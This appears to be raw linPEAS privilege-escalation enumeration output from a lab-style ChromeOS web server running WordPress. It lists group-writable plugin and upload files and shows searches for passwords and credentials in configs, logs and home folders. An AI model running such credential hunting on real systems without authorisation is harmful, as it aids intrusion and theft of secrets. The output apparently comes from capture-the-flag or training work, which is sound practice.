+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/ID3/license.txt
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/ID3/module.audio-video.asf.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/IXR
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/IXR/class-IXR-base64.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/IXR/class-IXR-client.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/IXR/class-IXR-clientmulticall.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/IXR/class-IXR-date.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/IXR/class-IXR-error.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Auth
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Auth.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Auth/Basic.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Cookie
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Cookie.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Cookie/Jar.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Exception
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Exception.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Exception/HTTP
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Exception/HTTP.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Exception/HTTP/304.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Exception/HTTP/305.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Exception/HTTP/306.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Exception/HTTP/400.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Exception/HTTP/401.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Exception/Transport
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Exception/Transport.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Exception/Transport/cURL.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Hooker.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Hooks.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/IDNAEncoder.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/IPv6.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/IRI.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Proxy/HTTP.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Response
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Response.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Response/Headers.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/SSL.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Session.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Transport
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Transport.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Transport/cURL.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Transport/fsockopen.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Utility
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/Requests/Utility/CaseInsensitiveDictionary.php
+
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                        
+  Group nginx:                                                                                                      
+/usr/local/share/nginx/html/main/wp-content/uploads                                                                 
+/usr/local/share/nginx/html/main/wp-content/uploads/2020
+/usr/local/share/nginx/html/main/wp-content/uploads/2020/06
+/usr/local/share/nginx/html/main/wp-content/uploads/2020/08
+/usr/local/share/nginx/html/main/wp-content/uploads/2020/07
+/usr/local/share/nginx/html/main/wp-content/plugins
+/usr/local/share/nginx/html/main/wp-content/plugins/index.php
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/.htaccess
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/class.akismet-widget.php
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/views
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/views/notice.php
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/views/get.php
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/views/connect-jp.php
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/views/title.php
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/views/activate.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/wrapper.php
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/readme.txt
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/index.php
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/changelog.txt
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/class.akismet.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/_inc/form.js
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/_inc/akismet.js
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/_inc/akismet.css
+/usr/local/share/nginx/html/main/wp-content/plugins/akismet/_inc/img
+/usr/local/share/nginx/html/main/wp-content/plugins/hello.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/uploads
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/uploads/2020
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/uploads/2020/06
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/uploads/2020/08
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/uploads/2020/07
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/index.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/.htaccess
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/class.akismet-widget.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/views
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/views/notice.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/views/get.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/views/connect-jp.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/views/title.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/views/activate.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/wrapper.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/readme.txt
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/index.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/changelog.txt
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/class.akismet.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/_inc/form.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/_inc/akismet.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/_inc/akismet.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/_inc/img
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/hello.php
+/tmp/screen
+
+╔══════════╣ Searching passwords in config PHP files
+                $pwd    = trim( wp_unslash( $_POST['pwd'] ) );                                                      
+                $pwd    = trim( wp_unslash( $_POST['pwd'] ) );
+                $pwd    = trim( wp_unslash( $_POST['pwd'] ) );
+                $pwd    = trim( wp_unslash( $_POST['pwd'] ) );
+
+╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+                                                                                                                    
+╔══════════╣ Finding IPs inside logs (limit 70)
+      4 10.10.10.229                                                                                                
+      1 10.10.10.255
+      1 10.10.10.2
+
+╔══════════╣ Finding passwords inside logs (limit 70)
+2021-07-18T21:02:56.616639+00:00 NOTICE sudo[823]:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/local/bin/nginx
+2021-07-18T21:03:04.477396+00:00 ERR cryptohomed[909]: GetOwnerPassword: Cannot get owner password until TPM is confirmed to be owned.
+2021-07-18T21:05:31.917835+00:00 NOTICE sudo[3724]:     root : TTY=unknown ; PWD=/ ; USER=chronos ; COMMAND=/bin/kill -9 -- -1
+2021-07-18T21:23:52.235892+00:00 ERR pam_pwdfile[7986]: user not found in password database
+2021-07-18T21:23:54.074398+00:00 CRIT sudo[7986]: pam_unix(sudo:auth): auth could not identify password for [nginx]
+2021-07-18T21:23:56.181813+00:00 ALERT sudo[7986]:    nginx : command not allowed ; TTY=unknown ; PWD=/dev/shm ; USER=root ; COMMAND=list
+
+╔══════════╣ Finding emails inside logs (limit 70)
+      1 dm-devel@redhat.com                                                                                         
+
+╔══════════╣ Finding *password* or *credential* files in home (limit 70)
+/mnt/stateful_partition/dev_image/include/boost/asio/ssl/detail/password_callback.hpp                               
+/mnt/stateful_partition/dev_image/include/gio-unix-2.0/gio/gunixcredentialsmessage.h
+/mnt/stateful_partition/dev_image/include/glib-2.0/gio/gcredentials.h
+/mnt/stateful_partition/dev_image/include/glib-2.0/gio/gtlspassword.h
+/mnt/stateful_partition/dev_image/include/mysql/get_password.h
+/mnt/stateful_partition/dev_image/include/mysql/plugin_validate_password.h
+/mnt/stateful_partition/dev_image/include/mysql/service_mysql_password_policy.h
+/mnt/stateful_partition/dev_image/include/php/ext/standard/php_password.h
+/mnt/stateful_partition/dev_image/include/plugin_validate_password.h
+/mnt/stateful_partition/dev_image/lib/mysql/plugin/validate_password.so
+/mnt/stateful_partition/dev_image/lib64/ruby/2.7.0/bundler/uri_credentials_filter.rb
+/mnt/stateful_partition/dev_image/libexec/git-core/git-credential
+/mnt/stateful_partition/dev_image/libexec/git-core/git-credential-cache
+/mnt/stateful_partition/dev_image/libexec/git-core/git-credential-cache--daemon
+/mnt/stateful_partition/dev_image/libexec/git-core/git-credential-store
+  #)There are more creds/passwds files in the previous parent folder
+
+/mnt/stateful_partition/dev_image/share/man/man3/gnutls_anon_allocate_server_credentials.3.gz
+/mnt/stateful_partition/dev_image/share/man/man3/gnutls_anon_free_client_credentials.3.gz
+/mnt/stateful_partition/dev_image/share/man/man3/gnutls_anon_free_server_credentials.3.gz
+  #)There are more creds/passwds files in the previous parent folder
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js/password-strength-meter.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js/password-strength-meter.min.js
+/mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-admin/js/password-strength-meter.js
+/mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-admin/js/password-strength-meter.min.js
+/mnt/stateful_partition/dev_image/share/nodebrew/node/v8.9.4/lib/node_modules/npm/lib/config/clear-credentials-by-uri.js
+/mnt/stateful_partition/dev_image/share/nodebrew/node/v8.9.4/lib/node_modules/npm/lib/config/get-credentials-by-uri.js
+/mnt/stateful_partition/dev_image/share/nodebrew/node/v8.9.4/lib/node_modules/npm/lib/config/set-credentials-by-uri.js
+/mnt/stateful_partition/dev_image/share/ri/2.7.0/system/Bundler/Settings/credentials_for-i.ri
+/mnt/stateful_partition/dev_image/share/ri/2.7.0/system/Bundler/Source/Git/GitProxy/uri_escaped_with_configured_credentials-i.ri                                                                                                        
+/mnt/stateful_partition/dev_image/share/ri/2.7.0/system/Bundler/Source/Rubygems/suppress_configured_credentials-i.ri
+/mnt/stateful_partition/dev_image/share/ri/2.7.0/system/Bundler/URI/File/check_password-i.ri
+/mnt/stateful_partition/dev_image/share/ri/2.7.0/system/Bundler/URI/File/set_password-i.ri
+/mnt/stateful_partition/dev_image/share/ri/2.7.0/system/Bundler/URI/Generic/check_password-i.ri
+/mnt/stateful_partition/dev_image/share/ri/2.7.0/system/Bundler/URI/Generic/password%3d-i.ri
+/mnt/stateful_partition/dev_image/share/ri/2.7.0/system/Bundler/URI/Generic/password-i.ri
+/mnt/stateful_partition/dev_image/share/ri/2.7.0/system/Bundler/URI/Generic/set_password-i.ri
+  #)There are more creds/passwds files in the previous parent folder
+
+/mnt/stateful_partition/dev_image/share/ri/2.7.0/system/Bundler/URICredentialsFilter/credential_filtered_uri-i.ri
+/mnt/stateful_partition/dev_image/share/ri/2.7.0/system/CGI/HtmlExtension/password_field-i.ri
+/mnt/stateful_partition/dev_image/share/ri/2.7.0/system/Gem/ConfigFile/check_credentials_permissions-i.ri
+/mnt/stateful_partition/dev_image/share/ri/2.7.0/system/Gem/ConfigFile/credentials_path-i.ri
+
+╔══════════╣ Finding passwords inside key folders (limit 70) - only PHP files
+                                                                                                                    
+╔══════════╣ Finding passwords inside key folders (limit 70) - no PHP files
+                                                                                                                    
+╔══════════╣ Finding possible password variables inside key folders (limit 140)
+                                                                                                                    
+
+╔══════════╣ Finding possible password in config files
+ /etc/tcsd.conf                                                                                                     
+credential.
+credential may have been provided to you by your TPM
+credential will be used. See
+credential.
+credential may have been provided to you by your TPM
+credential will be used. See
+credential.
+credential may have been provided to you by your TPM
+credential will be used. See
+ /etc/dbus-1/system.d/org.chromium.SystemProxy.conf
+Credentials"/>
+ /etc/dbus-1/system.d/org.chromium.SmbProvider.conf
+Credentials"/>
+ /etc/xl2tpd/xl2tpd.conf
+passwd for auth.
+ /etc/init/autologin.conf
+passwd=
+password from file. The file may optionally end with a newline.
+passwd" ]; then
+passwd="$(cat "${dir}/passwd")"
+passwd}" ]; then
+passwd}" -k enter
+
+╔══════════╣ Finding 'username' string inside key folders (limit 70)
+                                                                                                                    
+╔══════════╣ Searching specific hashes inside files - less false positives (limit 70)
